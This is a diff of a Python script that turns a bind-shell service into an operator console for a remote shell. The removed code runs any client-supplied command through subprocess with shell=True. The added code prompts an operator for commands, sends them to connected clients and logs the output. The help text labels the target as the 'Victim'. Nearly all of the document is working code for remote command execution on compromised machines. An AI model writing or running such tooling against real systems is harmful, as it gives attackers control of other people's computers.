@@ -11,6 +11,7 @@ import netifaces
 import threading
 from time import sleep
 
+
 FORMAT = "%(message)s"
 logging.basicConfig(
     level="NOTSET",
@@ -27,7 +28,7 @@ parser.add_argument(
     "--host",
     default="eth0",
     type=str,
-    help="Host to use when binding the socket"
+    help="Victim IP to connect to."
 )
 
 parser.add_argument(
@@ -35,12 +36,10 @@ parser.add_argument(
     "--port",
     required=True,
     type=int,
-    help="Port to use when binding the socket"
+    help="Victim PORT to connect to."
 )
 
 args = parser.parse_args()
-# Logging format: <LEVEL_INDICATOR> [CLIENT IP] [-> COMMAND] [ERROR]
-
 
 def check_iface(iface: str):
     try:
@@ -56,22 +55,7 @@ def check_iface(iface: str):
 
     return host
 
-
-class Service(socketserver.BaseRequestHandler):
-    def run(self, command: str) -> None:
-        """
-        Run a command with subprocess and return the output
-        """
-        process = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE
-        )
-
-        return process.communicate()
-
+class Server(socketserver.BaseRequestHandler):
     def send(self, data: str | bytes) -> None:
         """
         Send data to client
@@ -79,50 +63,44 @@ class Service(socketserver.BaseRequestHandler):
         if type(data) is str:
             data = data.encode("utf-8")
         self.request.sendall(data)
-
+    
     def receive(self) -> str:
         """
         Receive a 4096 bit stripped string from the client
         """
         return self.request.recv(4096).strip().decode("utf-8")
-
+    
     def handle(self) -> None:
         host, port = self.client_address
         log.info(f"[bold green][+][/] {host}:{port} connected")
 
         while True:
-            command = self.receive()
-
-            if not command.lower() == "quit":
-                try:
-                    if command != "":
-                        log.info(f"[bold blue][*][/] {host}:{port} -> {command}")
-
-                    stderr, stdout = self.run(command)
-                    self.send(stderr + stdout)
-                except BrokenPipeError as e:
-                    log.error(f"{host}:{port} {e}")
+            try:
+                cwd = self.receive()
+                command = input(f"{cwd} > ")
+                self.send(command)
+                if command.lower() == "quit":
+                    log.warning("Quitting.")
                     break
-            else:
-                self.send("[bold blue][*][/] Received <quit>. Exiting pseudo-shell\n")
-                log.info(f"[bold red][-][/] {host}:{port} quitted")
-
-                break
-
+                log.info(self.receive())
+            except BrokenPipeError as e:
+                log.error(f"{host}:{port} {e}.")
+            except KeyboardInterrupt as e:
+                log.error("Received keyboard interrupt.")
 
 class ThreadedService(
-        socketserver.ThreadingTCPServer,
-        socketserver.DatagramRequestHandler
+    socketserver.ThreadingTCPServer,
+    socketserver.DatagramRequestHandler
 ):
-    pass
+    pass 
 
 
-def main(args) -> None:
+def main(args):
     args.host = check_iface(args.host)
 
-    server = ThreadedService((args.host, args.port), Service)
+    server = ThreadedService((args.host, args.port), Server)
     server.allow_reuse_address = True
-
+   
     server_thread = threading.Thread(target=server.serve_forever)
     server_thread.daemon = True
     server_thread.start()
@@ -132,7 +110,6 @@ def main(args) -> None:
 
     while (threading.active_count() >= 2):
         sleep(10)
+    log.info("[bold blue][*][/] All clients disconnected")
 
-
-if __name__ == "__main__":
-    main(args)
+main(args)
